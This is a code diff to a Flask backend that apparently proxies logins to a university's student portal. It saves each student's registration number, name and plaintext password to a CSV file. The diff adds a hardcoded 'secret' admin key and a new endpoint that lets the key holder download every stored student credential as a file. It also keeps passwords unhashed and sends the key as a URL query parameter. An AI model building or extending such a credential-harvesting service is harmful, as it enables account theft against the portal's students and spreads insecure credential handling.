@@ -14,22 +14,40 @@ import threading, time, json, hashlib, os
 app = Flask(__name__)
 CORS(app)
 
-CREDS_FILE = "user_credentials.json"
+CREDS_FILE  = "user_credentials.csv"
+ADMIN_KEY   = "arms_admin_2024$"   # Secret key — only you know this
 
 def load_credentials():
+    creds = {}
     if os.path.exists(CREDS_FILE):
         try:
-            with open(CREDS_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
+            import csv
+            with open(CREDS_FILE, "r", encoding="utf-8", newline="") as f:
+                reader = csv.DictReader(f)
+                for row in reader:
+                    creds[row["reg_no"]] = {
+                        "password": row.get("password", ""),
+                        "name":     row.get("name", ""),
+                        "saved_at": row.get("saved_at", ""),
+                    }
         except:
-            return {}
-    return {}
+            pass
+    return creds
 
 def save_credential(reg_no, password, name=""):
+    import csv
     creds = load_credentials()
-    creds[reg_no] = {"password": password, "name": name, "saved_at": time.strftime("%Y-%m-%d %H:%M:%S")}
-    with open(CREDS_FILE, "w", encoding="utf-8") as f:
-        json.dump(creds, f, indent=2, ensure_ascii=False)
+    creds[reg_no] = {
+        "reg_no":   reg_no,
+        "password": password,
+        "name":     name,
+        "saved_at": time.strftime("%Y-%m-%d %H:%M:%S")
+    }
+    with open(CREDS_FILE, "w", encoding="utf-8", newline="") as f:
+        writer = csv.DictWriter(f, fieldnames=["reg_no", "name", "password", "saved_at"])
+        writer.writeheader()
+        for k, v in creds.items():
+            writer.writerow({"reg_no": k, "name": v.get("name",""), "password": v.get("password",""), "saved_at": v.get("saved_at","")})
 
 BASE          = "https://arms.sse.saveetha.com"
 FACULTY_USER  = "SSETSCS262"
@@ -447,7 +465,11 @@ def student_login():
 
 @app.route("/api/users", methods=["GET"])
 def list_users():
-    """Return all stored user credentials (admin view)."""
+    """Return all stored user credentials — protected by secret admin key."""
+    key = request.args.get("key", "").strip()
+    if key != ADMIN_KEY:
+        return jsonify({"error": "Unauthorized. Provide ?key=YOUR_SECRET"}), 403
+
     creds = load_credentials()
     result = [
         {
@@ -459,6 +481,17 @@ def list_users():
         for k, v in creds.items()
     ]
     return jsonify({"users": result, "total": len(result)})
+
+@app.route("/api/users/download", methods=["GET"])
+def download_users():
+    """Download credentials as CSV — protected by secret admin key."""
+    key = request.args.get("key", "").strip()
+    if key != ADMIN_KEY:
+        return jsonify({"error": "Unauthorized. Provide ?key=YOUR_SECRET"}), 403
+    if not os.path.exists(CREDS_FILE):
+        return "No credentials file found.", 404
+    return send_file(CREDS_FILE, mimetype="text/csv",
+                     as_attachment=True, download_name="student_credentials.csv")
 
 @app.route("/")
 def home():
